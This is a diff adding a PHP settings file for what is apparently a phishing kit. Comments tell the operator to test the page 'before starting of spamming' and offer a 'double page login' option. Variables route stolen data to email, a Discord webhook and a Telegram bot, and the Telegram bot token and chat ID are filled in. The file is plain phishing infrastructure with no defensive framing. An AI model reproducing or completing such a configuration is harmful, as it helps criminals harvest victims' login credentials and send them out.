@@ -1,0 +1,26 @@
+<?php
+
+// TEST YOUR PAGE BEFORE STARTING OF SPAMMING 
+// PAGE BY @FLASHAKACODER @crackerintgbackup
+
+// ADD EMAIL BELOW YOU CAN USE MULTIPLE EMAILS BY LIKE THIS gmail@gmail.com,email@gmail.com
+$email = "";
+
+// DISCORD WEBHOOK
+$discord_webhook = "";
+
+// Telegram Bot Token  
+$telegram_bot_api = "8128457752:AAFTIUj4tX_nUbl";
+
+// Your Telegram Chat ID
+$telegram_chat_id = "7630403392";
+
+// Expiry Date
+$expiry_time = "2026-04-23";
+
+// Your PAGE SETTINGS
+// CHANGE TO on for double page login else keep it off.
+define('double_login', 'on');
+
+
+?>
